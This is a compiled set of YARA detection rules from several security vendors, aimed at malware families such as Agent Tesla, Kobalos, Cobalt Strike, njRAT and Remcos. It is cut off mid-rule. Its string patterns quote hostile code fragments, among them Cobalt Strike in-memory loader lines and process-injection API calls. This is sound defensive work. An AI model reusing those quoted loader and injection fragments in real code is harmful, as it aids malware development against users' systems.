rule CAPE_Agent_Tesla
{
	meta:
		description = "Detecting HTML strings used by Agent Tesla malware"
		author = "Stormshield"
		id = "5383994b-357d-539b-89b1-53be238f759d"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3468ef14dbf65c0c3219e32830860967d6da51d5/data/yara/CAPE/AgentTesla.yar#L1-L17"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3468ef14dbf65c0c3219e32830860967d6da51d5/LICENSE"
		logic_hash = "3945754129dcc58e0abfd7485f5ff0c0afdd1078ae2cf164ca8f59a6f79db1be"
		score = 75
		quality = 70
		tags = ""
		version = "1.0"

	strings:
		$html_username = "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " wide ascii
		$html_pc_name = "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " wide ascii
		$html_os_name = "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " wide ascii
		$html_os_platform = "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " wide ascii
		$html_clipboard = "<br><span style=font-style:normal;text-decoration:none;text-transform:none;color:#FF0000;><strong>[clipboard]</strong></span>" wide ascii

	condition:
		3 of them
}

rule DELIVRTO_SUSP_HTML_WASM_Smuggling
{
	meta:
		description = "Presence of Base64 JavaScript blob loading WASM"
		author = "delivr.to"
		id = "fc83bb4f-ba8a-52d2-b9ce-632da5341f77"
		date = "2024-02-28"
		modified = "2024-05-24"
		reference = "https://github.com/delivr-to/detections"
		source_url = "https://github.com/delivr-to/detections/blob/376762d71eb1777874d366136595994378416ef5/yara-rules/html_wasm.yar#L1-L13"
		license_url = "N/A"
		logic_hash = "4bca88862c28db947c04c40e40fdecc682223d1eb90c98350fbd6c5d8c6c4636"
		score = 70
		quality = 80
		tags = ""

	strings:
		$wasm = "WebAssembly.Module" base64
		$int = "WebAssembly.Instance" base64
		$inst = "WebAssembly.instantiate" base64

	condition:
		all of them
}

rule ESET_Kobalos_Ssh_Credential_Stealer
{
	meta:
		description = "Kobalos SSH credential stealer seen in OpenSSH client"
		author = "Marc-Etienne M.Léveillé"
		id = "b1fc5163-de48-57fc-8ae7-1f2be6c64d8a"
		date = "2020-11-02"
		modified = "2021-02-01"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/kobalos/kobalos.yar#L58-L73"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "be238f5c2cc976a5638584a8c0fc580f2076735aadfe374e8d4162ba723bce10"
		score = 75
		quality = 80
		tags = ""
		license = "BSD 2-Clause"
		version = "1"

	strings:
		$ = "user: %.128s host: %.128s port %05d user: %.128s password: %.128s"

	condition:
		any of them
}

rule ESET_Turla_Outlook_Filenames
{
	meta:
		description = "Turla Outlook filenames"
		author = "ESET Research"
		id = "3a08003d-50d6-5fdf-9f74-222335ebfa3e"
		date = "2018-08-22"
		modified = "2018-09-05"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/turla/turla-outlook.yar#L76-L91"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "3be86c9325de6634c032321beed131fdf1e1952afcb43258fb202d0097610501"
		score = 75
		quality = 80
		tags = ""
		contact = "github@eset.com"
		license = "BSD 2-Clause"

	strings:
		$s1 = "mapid.tlb"
		$s2 = "msmime.dll"
		$s3 = "scawrdot.db"

	condition:
		any of them
}

rule ESET_Sparklinggoblin_Mutex
{
	meta:
		description = "SparklingGoblin ChaCha20 loaders mutexes"
		author = "ESET Research"
		id = "e33d2bc1-29d6-5117-8e0f-31f8bced0979"
		date = "2021-05-20"
		modified = "2021-08-26"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/sparklinggoblin/SparklingGoblin.yar#L465-L489"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		hash = "2edbea43f5c40c867e5b6bbd93cc972525df598b"
		hash = "b6d245d3d49b06645c0578804064ce0c072cbe0f"
		hash = "8be6d5f040d0085c62b1459afc627707b0de89cf"
		hash = "4668302969fe122874fb2447a80378dcb671c86b"
		hash = "9bdecb08e16a23d271d0a3e836d9e7f83d7e2c3b"
		hash = "9ce7650f2c08c391a35d69956e171932d116b8bd"
		logic_hash = "00fbd514c8e2d6dea3b0f175e857a613e158b64caf1f970e814d62f1ebe9d35c"
		score = 75
		quality = 80
		tags = ""
		license = "BSD 2-Clause"

	strings:
		$mutex_1 = "kREwdFrOlvASgP4zWZyV89m6T2K0bIno"
		$mutex_2 = "v5EPQFOImpTLaGZes3Nl1JSKHku8AyCw"

	condition:
		any of them
}

rule ESET_Apt_Windows_TA410_Tendyron_Installer
{
	meta:
		description = "TA410 Tendyron Installer"
		author = "ESET Research"
		id = "95ccad1c-99fb-5d38-aec0-650db3e06b35"
		date = "2020-12-09"
		modified = "2022-04-27"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/ta410/ta410.yar#L55-L73"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "9c3afb924747614f27c31cf2c3d98f4932a9d11597a3ac94263bf93be02801da"
		score = 75
		quality = 80
		tags = ""
		license = "BSD 2-Clause"
		version = "1"

	strings:
		$s1 = "Tendyron" wide
		$s2 = "OnKeyToken_KEB.dll" wide
		$s3 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" wide
		$s4 = "Global\\8D32CCB321B2"
		$s5 = "\\RTFExploit\\"

	condition:
		int16 ( 0 ) == 0x5A4D and 3 of them
}

rule ESET_Apt_Windows_TA410_X4_Strings
{
	meta:
		description = "Matches various strings found in TA410 X4"
		author = "ESET Research"
		id = "e6af4516-8b79-5182-8571-7dd530632ddc"
		date = "2020-10-09"
		modified = "2022-04-27"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/ta410/ta410.yar#L109-L125"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "d4b2321a6d0eb0ca8d7c47596af2a45c22b3aef15d1832d64d6588a62cab312a"
		score = 75
		quality = 74
		tags = ""
		license = "BSD 2-Clause"
		version = "1"

	strings:
		$s1 = "[X]InLoadSC" ascii wide nocase
		$s3 = "MachineKeys\\Log\\rsa.txt" ascii wide nocase
		$s4 = "MachineKeys\\Log\\output.log" ascii wide nocase

	condition:
		any of them
}

rule FIREEYE_RT_APT_Backdoor_Win_Gorat_Memory
{
	meta:
		description = "Identifies GoRat malware in memory based on strings."
		author = "FireEye"
		id = "16fb1db7-711c-5d8d-9203-738c94f253fe"
		date = "2020-12-09"
		modified = "2020-12-09"
		reference = "https://github.com/mandiant/red_team_tool_countermeasures/"
		source_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/rules/REDFLARE (Gorat)/production/yara/APT_Backdoor_Win_GoRat_Memory.yar#L4-L27"
		license_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/LICENSE.txt"
		hash = "3b926b5762e13ceec7ac3a61e85c93bb"
		logic_hash = "88272e59325d106f96d6b6f1d57daf968823c1e760067dee0334c66c521ce8c2"
		score = 75
		quality = 75
		tags = ""
		rev = 1

	strings:
		$murica = "murica" fullword
		$rat1 = "rat/modules/socks.(*HTTPProxyClient).beacon" fullword
		$rat2 = "rat.(*Core).generateBeacon" fullword
		$rat3 = "rat.gJitter" fullword
		$rat4 = "rat/comms.(*protectedChannel).SendCmdResponse" fullword
		$rat5 = "rat/modules/filemgmt.(*acquire).NewCommandExecution" fullword
		$rat6 = "rat/modules/latlisten.(*latlistensrv).handleCmd" fullword
		$rat7 = "rat/modules/netsweeper.(*netsweeperRunner).runSweep" fullword
		$rat8 = "rat/modules/netsweeper.(*Pinger).listen" fullword
		$rat9 = "rat/modules/socks.(*HTTPProxyClient).beacon" fullword
		$rat10 = "rat/platforms/win/dyloader.(*memoryLoader).ExecutePluginFunction" fullword
		$rat11 = "rat/platforms/win/modules/namedpipe.(*dummy).Open" fullword
		$winblows = "rat/platforms/win.(*winblows).GetStage" fullword

	condition:
		$winblows or #murica > 10 or 3 of ( $rat* )
}

rule FIREEYE_RT_Trojan_Macro_RESUMEPLEASE_1
{
	meta:
		description = "No description has been set in the source file - FireEye-RT"
		author = "FireEye"
		id = "068662f6-28b8-5538-8bc3-6506565305ae"
		date = "2020-12-01"
		date = "2020-12-01"
		modified = "2020-12-09"
		reference = "https://github.com/mandiant/red_team_tool_countermeasures/"
		source_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/rules/RESUMEPLEASE/production/yara/Trojan_Macro_RESUMEPLEASE_1.yar#L4-L21"
		license_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/LICENSE.txt"
		hash = "d5d3d23c8573d999f1c48d3e211b1066"
		logic_hash = "040457bc446e496431129ff4623ddda5d9c2ce339ba65a7fbe42114626f36c60"
		score = 75
		quality = 75
		tags = ""
		rev = 1

	strings:
		$str00 = "For Binary As"
		$str01 = "Range.Text"
		$str02 = "Environ("
		$str03 = "CByte("
		$str04 = ".SpawnInstance_"
		$str05 = ".Create("

	condition:
		all of them
}

rule FIREEYE_RT_APT_Builder_PY_REDFLARE_1
{
	meta:
		description = "No description has been set in the source file - FireEye-RT"
		author = "FireEye"
		id = "3b5ad25d-ce66-572e-9a91-40a73b8fd447"
		date = "2020-11-27"
		date = "2020-11-27"
		modified = "2020-12-09"
		reference = "https://github.com/mandiant/red_team_tool_countermeasures/"
		source_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/rules/REDFLARE/production/yara/APT_Builder_PY_REDFLARE_1.yar#L4-L22"
		license_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/LICENSE.txt"
		hash = "d0a830403e56ebaa4bfbe87dbfdee44f"
		logic_hash = "1948cadb7242eb69bffbc222802ce9c1af38d7a846da09b6343b1449fe054e42"
		score = 75
		quality = 75
		tags = ""
		rev = 1

	strings:
		$1 = "LOAD_OFFSET_32 = 0x612"
		$2 = "LOAD_OFFSET_64 = 0x611"
		$3 = "class RC4:"
		$4 = "struct.pack('<Q' if is64b else '<L'"
		$5 = "stagerConfig['comms']['config']"
		$6 = "_x86.dll"
		$7 = "_x64.dll"

	condition:
		all of them and @1 [ 1 ] < @2 [ 1 ] and @2 [ 1 ] < @3 [ 1 ] and @3 [ 1 ] < @4 [ 1 ] and @4 [ 1 ] < @5 [ 1 ]
}

rule GCTI_Cobaltstrike_Resources_Template_X64_Ps1_V3_0_To_V4_X_Excluding_3_12_3_13
{
	meta:
		description = "Cobalt Strike's resources/template.x64.ps1, resources/template.hint.x64.ps1 and resources/template.hint.x32.ps1 from v3.0 to v4.x except 3.12 and 3.13"
		author = "gssincla@google.com"
		id = "5a808113-aacb-56ca-b3ec-166c73c54b85"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Template_x64_Ps1_v3_0_to_v4_x_excluding_3_12_3_13.yara#L17-L37"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "ff743027a6bcc0fee02107236c1f5c96362eeb91f3a5a2e520a85294741ded87"
		logic_hash = "80823b8590004686ebd83958cad16094ea2f6958a837d87934507531a00df77a"
		score = 75
		quality = 81
		tags = ""

	strings:
		$dda = "[AppDomain]::CurrentDomain.DefineDynamicAssembly" nocase
		$imm = "InMemoryModule" nocase
		$mdt = "MyDelegateType" nocase
		$rd = "New-Object System.Reflection.AssemblyName('ReflectedDelegate')" nocase
		$data = "[Byte[]]$var_code = [System.Convert]::FromBase64String(" nocase
		$64bitSpecific = "[IntPtr]::size -eq 8"
		$mandatory = "Mandatory = $True"

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Template_Sct_V3_3_To_V4_X
{
	meta:
		description = "Cobalt Strike's resources/template.sct signature for versions v3.3 to v4.x"
		author = "gssincla@google.com"
		id = "9d2b1dfa-5f76-503f-9198-6ed0d039e0cb"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Template_Sct_v3_3_to_v4_x.yara#L17-L38"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "fc66cb120e7bc9209882620f5df7fdf45394c44ca71701a8662210cf3a40e142"
		logic_hash = "8868445ced4945c469764b7f311d6cb11c99cf0f2d770113e5e617e0187a962c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$scriptletstart = "<scriptlet>" nocase
		$registration = "<registration progid=" nocase
		$classid = "classid=" nocase
		$scriptlang = "<script language=\"vbscript\">" nocase
		$cdata = "<![CDATA["
		$scriptend = "</script>" nocase
		$antiregistration = "</registration>" nocase
		$scriptletend = "</scriptlet>"

	condition:
		all of them and @scriptletstart [ 1 ] < @registration [ 1 ] and @registration [ 1 ] < @classid [ 1 ] and @classid [ 1 ] < @scriptlang [ 1 ] and @scriptlang [ 1 ] < @cdata [ 1 ]
}

rule GCTI_Cobaltstrike_Resources_Command_Ps1_V2_5_To_V3_7_And_Resources_Compress_Ps1_V3_8_To_V4_X
{
	meta:
		description = "Cobalt Strike's resources/command.ps1 for versions 2.5 to v3.7 and resources/compress.ps1 from v3.8 to v4.x"
		author = "gssincla@google.com"
		id = "c0b81deb-ed20-5f7e-8e15-e6a9e9362594"
		date = "2022-11-18"
		modified = "2022-11-22"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Command_Ps1_v2_5_to_v3_7_and_Resources_Compress_Ps1_v3_8_to_v4_x.yara#L17-L33"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "932dec24b3863584b43caf9bb5d0cfbd7ed1969767d3061a7abdc05d3239ed62"
		logic_hash = "31cf47060757b086d325cd205724a7be8931bbbc6ff2f4be67a6179ee99c42ca"
		score = 75
		quality = 85
		tags = ""

	strings:
		$ps1 = "$s=New-Object \x49O.MemoryStream(,[Convert]::\x46romBase64String(" nocase
		$ps2 = "));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();" nocase

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Template_X86_Vba_V3_8_To_V4_X
{
	meta:
		description = "Cobalt Strike's resources/template.x86.vba signature for versions v3.8 to v4.x"
		author = "gssincla@google.com"
		id = "11c7758e-93b2-5fe3-873d-b98de579d2b4"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Template_x86_Vba_v3_8_to_v4_x.yara#L17-L37"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "fc66cb120e7bc9209882620f5df7fdf45394c44ca71701a8662210cf3a40e142"
		logic_hash = "7114515477d82651806eccef34f599f6ffd4614f987dee29417ac6ef7a1a1c38"
		score = 75
		quality = 85
		tags = ""

	strings:
		$createstuff = "Function CreateStuff Lib \"kernel32\" Alias \"CreateRemoteThread\"" nocase
		$allocstuff = "Function AllocStuff Lib \"kernel32\" Alias \"VirtualAllocEx\"" nocase
		$writestuff = "Function WriteStuff Lib \"kernel32\" Alias \"WriteProcessMemory\"" nocase
		$runstuff = "Function RunStuff Lib \"kernel32\" Alias \"CreateProcessA\"" nocase
		$vars = "Dim rwxpage As Long" nocase
		$res = "RunStuff(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)"
		$rwxpage = "AllocStuff(pInfo.hProcess, 0, UBound(myArray), &H1000, &H40)"

	condition:
		all of them and @vars [ 1 ] < @res [ 1 ] and @allocstuff [ 1 ] < @rwxpage [ 1 ]
}

rule GCTI_Cobaltstrike_Resources_Template_Py_V3_3_To_V4_X
{
	meta:
		description = "Cobalt Strike's resources/template.py signature for versions v3.3 to v4.x"
		author = "gssincla@google.com"
		id = "16aef9a9-b217-5462-93dc-f6273c99ddd0"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Template_Py_v3_3_to_v4_x.yara#L17-L36"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "d5cb406bee013f51d876da44378c0a89b7b3b800d018527334ea0c5793ea4006"
		logic_hash = "3c26cea4b8f2b200bf58e939ae9ead7a7339d4ec0de8c72b3d9c7da897600081"
		score = 75
		quality = 85
		tags = ""

	strings:
		$arch = "platform.architecture()"
		$nope = "WindowsPE"
		$alloc = "ctypes.windll.kernel32.VirtualAlloc"
		$movemem = "ctypes.windll.kernel32.RtlMoveMemory"
		$thread = "ctypes.windll.kernel32.CreateThread"
		$wait = "ctypes.windll.kernel32.WaitForSingleObject"

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Template__X32_X64_Ps1_V1_45_To_V2_5_And_V3_11_To_V3_14
{
	meta:
		description = "Cobalt Strike's resources/template.x64.ps1, resources/template.x32 from v3.11 to v3.14 and resources/template.ps1 from v1.45 to v2.5 "
		author = "gssincla@google.com"
		id = "c9fa6a39-0098-5dde-9762-94bc6b2df299"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Template__x32_x64_Ps1_v1_45_to_v2_5_and_v3_11_to_v3_14.yara#L17-L43"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "ff743027a6bcc0fee02107236c1f5c96362eeb91f3a5a2e520a85294741ded87"
		logic_hash = "5196f111f257239d2e7e4ca342e7fc8bac1687743bc8c7ff23addf1f094b2e93"
		score = 75
		quality = 85
		tags = ""

	strings:
		$importVA = "[DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc" nocase
		$importCT = "[DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread" nocase
		$importWFSO = "[DllImport(\"kernel32.dll\")] public static extern int WaitForSingleObject" nocase
		$compiler = "New-Object Microsoft.CSharp.CSharpCodeProvider" nocase
		$params = "New-Object System.CodeDom.Compiler.CompilerParameters" nocase
		$paramsSys32 = ".ReferencedAssemblies.AddRange(@(\"System.dll\", [PsObject].Assembly.Location))" nocase
		$paramsGIM = ".GenerateInMemory = $True" nocase
		$result = "$compiler.CompileAssemblyFromSource($params, $assembly)" nocase

	condition:
		all of them
}

rule JPCERTCC_Himawari
{
	meta:
		description = "detect Himawari(a variant of RedLeaves) in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "85c33dc6-0f9b-5645-b236-f416df16b4a4"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "https://www.jpcert.or.jp/present/2018/JSAC2018_01_nakatsuru.pdf"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L68-L82"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "9014e6e02fb9d8fa0f646c61647ab28c3cb08f10f8f584ddd11eba27211307f5"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"
		hash1 = "3938436ab73dcd10c495354546265d5498013a6d17d9c4f842507be26ea8fafb"

	strings:
		$h1 = "himawariA"
		$h2 = "himawariB"
		$h3 = "HimawariDemo"

	condition:
		all of them
}

rule JPCERTCC_Hawkeye
{
	meta:
		description = "detect HawkEye in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "fc988aaf-bdac-5a53-a90c-d35d86285cd6"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "internal research"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L259-L272"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "45256e1e56de3934d2e57a7c036d49a0f56c25538ed7ad3eb7ee8efa7f549e98"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"

	strings:
		$hawkstr1 = "HawkEye Keylogger" wide
		$hawkstr2 = "Dear HawkEye Customers!" wide
		$hawkstr3 = "HawkEye Logger Details:" wide

	condition:
		all of them
}

rule JPCERTCC_Xxmm
{
	meta:
		description = "detect xxmm in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "be459cbf-84a1-539e-b0b5-b7a00b6d278d"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "internal research"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L306-L319"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "4a860ac3efb97ce03fa906c2d0e7cd08654f6e82531d9449af7891be83a036d5"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"

	strings:
		$v1 = "setupParameter:"
		$v2 = "loaderParameter:"
		$v3 = "parameter:"

	condition:
		all of them
}

rule JPCERTCC_Netwire
{
	meta:
		description = "detect netwire in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "cf71b80f-2618-5209-bb49-fefea9e0a7f3"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "internal research"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L351-L367"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "fa6ec967b6b3de226dcdb06d6b8f684800331a2420f038dd6274a8b9c3d8be78"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"

	strings:
		$v1 = "HostId-%Rand%"
		$v2 = "mozsqlite3"
		$v3 = "[Scroll Lock]"
		$v4 = "GetRawInputData"
		$ping = "ping 192.0.2.2"
		$log = "[Log Started] - [%.2d/%.2d/%d %.2d:%.2d:%.2d]"

	condition:
		($v1 ) or ( $v2 and $v3 and $v4 ) or ( $ping and $log )
}

rule JPCERTCC_Nanocore
{
	meta:
		description = "detect Nanocore in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "0b12ad94-99c2-5d48-a860-ff75b82971af"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "internal research"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L369-L382"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "471dcda6f5fb9c30e3a1df7171fdba889114d54166d038d18c7910e2765d5250"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"

	strings:
		$v1 = "NanoCore Client"
		$v2 = "PluginCommand"
		$v3 = "CommandType"

	condition:
		all of them
}

rule JPCERTCC_Agenttesla_Type1
{
	meta:
		description = "detect Agenttesla in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "92bfb3ab-d8d0-50ec-8ab8-ad34f1edb906"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "internal research"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L399-L411"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "24b9b815400967a9086048527f7aa1fce08bcd94a16aec8080aeac97045b297a"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"

	strings:
		$iestr = "C:\\\\Users\\\\Admin\\\\Desktop\\\\IELibrary\\\\IELibrary\\\\obj\\\\Debug\\\\IELibrary.pdb"
		$atstr = "C:\\\\Users\\\\Admin\\\\Desktop\\\\ConsoleApp1\\\\ConsoleApp1\\\\obj\\\\Debug\\\\ConsoleApp1.pdb"
		$sqlitestr = "Not a valid SQLite 3 Database File" wide

	condition:
		all of them
}

rule JPCERTCC_Noderat
{
	meta:
		description = "detect Noderat in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "9c2c4b0f-0f45-54f6-a98c-b592af882eef"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "https://blogs.jpcert.or.jp/ja/2019/02/tick-activity.html"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L429-L442"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "e1254b6cf28161943db202ea0a6ff2d86aa7975d4a3ecc0f26eed58101e54960"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"

	strings:
		$config = "/config/app.json"
		$key = "/config/.regeditKey.rc"
		$message = "uninstall error when readFileSync: "

	condition:
		all of them
}

rule JPCERTCC_Njrat
{
	meta:
		description = "detect njRAT in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "96b35796-3e1d-5721-998a-e678612e4de7"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "https://github.com/JPCERTCC/MalConfScan/"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L444-L456"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "398614ff5ea37dfaf6c36f60702cb7cdfe66b4569c698e9c3ea29563e4031856"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"
		hash1 = "d5f63213ce11798879520b0e9b0d1b68d55f7727758ec8c120e370699a41379d"

	strings:
		$reg = "SEE_MASK_NOZONECHECKS" wide fullword
		$msg = "Execute ERROR" wide fullword
		$ping = "cmd.exe /c ping 0 -n 2 & del" wide fullword

	condition:
		all of them
}

rule JPCERTCC_Remcos_1
{
	meta:
		description = "detect Remcos in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "4a27a16a-2669-5009-bc82-082ec0c9b2c1"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "https://github.com/JPCERTCC/MalConfScan/"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L480-L493"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "1b4b9f7a88f33faeda71ea9a354eeccba8889800f48a6280c4ec533bb1b3ef3d"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"
		hash1 = "7d5efb7e8b8947e5fe1fa12843a2faa0ebdfd7137582e5925a0b9c6a9350b0a5"

	strings:
		$remcos = "Remcos" ascii fullword
		$url1 = "Breaking-Security.Net" ascii fullword
		$url2 = "BreakingSecurity.Net" ascii fullword
		$resource = "SETTINGS" ascii wide fullword

	condition:
		1 of ( $url* ) and $remcos and $resource
}

rule SECUINFRA_OBFUS_Javascript_Wscript_Hex_Strings_Usage
{
	meta:
